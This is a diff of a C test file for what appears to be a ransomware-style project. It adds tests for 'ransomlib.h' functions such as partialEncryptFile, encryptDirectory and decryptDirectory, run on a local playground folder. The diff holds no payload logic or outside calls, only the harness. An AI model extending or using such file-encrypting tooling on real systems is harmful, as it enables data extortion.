@@ -1,6 +1,11 @@
 #include "../../client/common/clonelib.h"
+#include "../../client/common/thirdparty/b64.h"
+#include "../../client/common/crypt.h"
+#include "../../client/common/ransomlib.h"
 #include "../../client/common/common.h"
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #define TEST_DIR "./playground/"
 int main(int argc, char** argv){argc=argc;
 	const char* test_string="Hungry";
@@ -54,16 +59,24 @@ int main(int argc, char** argv){argc=argc;
 	//Test functions symEn/Decrypt
 	status=symEncrypt(&encrypted_msg,keyiv,test_string,strlen(test_string));
 	printf("symEncrypt:\t%s\n",status?"OK":"Failed");
-	status=symDecrypt(&decrypted_msg,keyiv,encrypted_msg,strlen(test_string));
+	status=symDecrypt(&decrypted_msg,keyiv,encrypted_msg,strlen(encrypted_msg));
 	printf("symDecrypt:\t%s\n",status?"OK":"Failed");
 	printf("Together:\t%s(%s)\n",!strcmp(decrypted_msg,test_string)?"OK":"Failed",decrypted_msg);
 	
+	
+	printf("\nTesting ransomlib.h\n");
+	//Test function partialEncryptFile
+	status=partialEncryptFile(keyiv,TEST_DIR "dummy.txt",5,0);
+	printf("partialEncryptFile:\t%s\n",status?"OK":"Failed");
+	status=partialEncryptFile(keyiv,TEST_DIR "dummy.txt",5,1);
+	printf("partialEncryptFile-d:\t%s\n",status?"OK":"Failed");
 	
 	
 	
 	
 	//Test encryption/description
-	
+	printf("encryptDirectory:\t%s\n",encryptDirectory(keyiv,TEST_DIR)?"OK":"Failed");
+	printf("decryptDirectory:\t%s\n",decryptDirectory(keyiv,TEST_DIR)?"OK":"Failed");
 	
 	printf("\n");
 	return 0;
